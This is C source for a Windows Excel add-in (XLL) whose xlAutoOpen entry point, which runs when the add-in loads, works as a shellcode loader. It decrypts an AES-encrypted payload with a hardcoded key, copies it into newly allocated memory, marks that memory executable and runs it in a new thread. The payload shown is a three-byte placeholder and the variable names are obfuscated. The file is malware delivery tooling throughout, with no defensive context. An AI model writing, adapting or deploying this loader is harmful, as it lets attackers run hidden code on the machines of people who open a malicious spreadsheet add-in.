#include "stdafx.h"
#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char* XtrZuQ, unsigned int XtrZuQ_len, char* tea, size_t tealen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)tea, (DWORD)tealen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)XtrZuQ, (DWORD*)&XtrZuQ_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}


//AES encrypted payload
unsigned char XtrZuQ[] = {0x90, 0x90, 0x90};
//AESKey
unsigned char tea[] = { 0xc8, 0x8e, 0xc4, 0xbe, 0x55, 0x45, 0xb8, 0x13, 0xe3, 0x6b, 0xc5, 0xe8, 0x65, 0xdc, 0xbf, 0x1a };

short __stdcall xlAutoOpen()
{
	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	unsigned int XtrZuQ_len = sizeof(XtrZuQ);
	exec_mem = VirtualAlloc(0, XtrZuQ_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	AESDecrypt((char*)XtrZuQ, XtrZuQ_len, (char*)tea, sizeof(tea));
	RtlMoveMemory(exec_mem, XtrZuQ, XtrZuQ_len);

	rv = VirtualProtect(exec_mem, XtrZuQ_len, PAGE_EXECUTE_READ, &oldprotect);
	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	return 0;

}